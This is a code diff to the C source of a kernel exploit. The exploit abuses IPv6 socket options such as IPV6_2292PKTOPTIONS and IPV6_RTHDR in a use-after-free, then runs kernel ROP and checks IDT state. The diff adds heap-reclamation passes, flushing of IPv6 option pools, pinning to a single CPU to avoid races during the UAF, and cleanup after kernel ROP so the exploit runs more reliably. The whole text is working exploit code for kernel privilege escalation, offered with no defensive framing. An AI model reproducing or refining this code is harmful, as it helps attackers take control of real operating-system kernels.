@@ -33,6 +33,9 @@
 #define MAX_ATTEMPTS 10
 #define HEAP_GROOM_COUNT 100
 #define STABILIZATION_PASSES 3
+#define AGGRESSIVE_RECLAIM_PASSES 5
+#define AGGRESSIVE_SOCKETS_PER_PASS 256
+#define POST_KROP_CLEANUP_PASSES 4
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
@@ -273,6 +276,81 @@ void sidt(unsigned long long* addr, unsigned short* size) {
     *addr = *(unsigned long long*)(buf + 2);
 }
 
+void aggressive_heap_reclamation() {
+    for (int pass = 0; pass < AGGRESSIVE_RECLAIM_PASSES; pass++) {
+        int reclaim_sockets[AGGRESSIVE_SOCKETS_PER_PASS];
+        int created_count = 0;
+
+        // Allocate many sockets to fill in fragmented holes
+        for (int i = 0; i < AGGRESSIVE_SOCKETS_PER_PASS; i++) {
+            reclaim_sockets[i] = new_socket();
+            if (reclaim_sockets[i] >= 0) {
+                created_count++;
+                reset_ipv6_opts(reclaim_sockets[i]);
+
+                if (i % 32 == 0)
+                    nanosleep(NANOSLEEP_50US, NULL);
+            }
+        }
+
+        nanosleep(NANOSLEEP_100US, NULL);
+
+        // Close in reverse order to allow proper coalescing
+        for (int i = created_count - 1; i >= 0; i--) {
+            if (reclaim_sockets[i] >= 0)
+                safe_close_socket(reclaim_sockets[i]);
+        }
+
+        nanosleep(NANOSLEEP_75US, NULL);
+    }
+}
+
+void flush_ipv6_option_pools() {
+    // Force cleanup of IPv6 option structures to prevent dangling references
+    int flush_sockets[128];
+
+    for (int i = 0; i < 128; i++) {
+        flush_sockets[i] = new_socket();
+        if (flush_sockets[i] >= 0) {
+            // Set and immediately unset options to exercise kernel cleanup paths
+            char dummy[256] = {0};
+            setsockopt(flush_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, dummy, sizeof(int));
+            set_pktopts(flush_sockets[i], dummy, 32);
+            set_rthdr(flush_sockets[i], dummy, 64);
+            reset_ipv6_opts(flush_sockets[i]);
+        }
+    }
+
+    nanosleep(NANOSLEEP_100US, NULL);
+
+    for (int i = 127; i >= 0; i--) {
+        if (flush_sockets[i] >= 0)
+            safe_close_socket(flush_sockets[i]);
+    }
+
+    nanosleep(NANOSLEEP_100US, NULL);
+}
+
+void validate_and_repair_kernel_structures() {
+    // Verify critical kernel structures are intact
+    for (int check_pass = 0; check_pass < 3; check_pass++) {
+        unsigned long long current_idt_base;
+        unsigned short current_idt_size;
+
+        sidt(&current_idt_base, &current_idt_size);
+
+        // If IDT looks corrupted, trigger memory stabilization
+        if (current_idt_size < 0xFE || current_idt_base == 0) {
+            aggressive_heap_reclamation();
+            flush_ipv6_option_pools();
+            nanosleep(NANOSLEEP_10MS, NULL);
+        } else {
+            break;  // Kernel structures look good
+        }
+    }
+}
+
+
 int verify_idt(unsigned long long expected_base) {
     unsigned long long current_base;
     unsigned short current_size;
@@ -297,7 +375,13 @@ void restore_kernel_state() {
             break;
         }
 
-        stabilize_kernel_memory();
+        if (restoration_attempts >= 2) {
+            aggressive_heap_reclamation();
+            flush_ipv6_option_pools();
+        } else {
+            stabilize_kernel_memory();
+        }
+        
         nanosleep(NANOSLEEP_10MS, NULL);
     }
 }
@@ -336,6 +420,9 @@ int main() {
         return 179;
 
     save_kernel_state();
+    
+    // Pin to single CPU early to prevent cross-CPU race conditions during UAF
+    pin_to_cpu(0);
 
     for (int i = 0; i < 16; i++)
         new_socket();
@@ -476,13 +563,27 @@ int main() {
 		}
 		
 		nanosleep(NANOSLEEP_50US, NULL);
+		
+		for (int post_krop_pass = 0; post_krop_pass < POST_KROP_CLEANUP_PASSES; post_krop_pass++) {
+			aggressive_heap_reclamation();
+			
+			if (post_krop_pass % 2 == 1) {
+				flush_ipv6_option_pools();
+			}
+			
+			nanosleep(NANOSLEEP_100US, NULL);
+		}
 	}
+
+    validate_and_repair_kernel_structures();
 
     if (!idt_check(idt_base)) {
         restore_kernel_state();
     }
 
     comprehensive_cleanup(&cleanup_state);
+    aggressive_heap_reclamation();
     nanosleep(NANOSLEEP_10MS, NULL);
+    
     return exploit_success ? 0 : 1;
 }
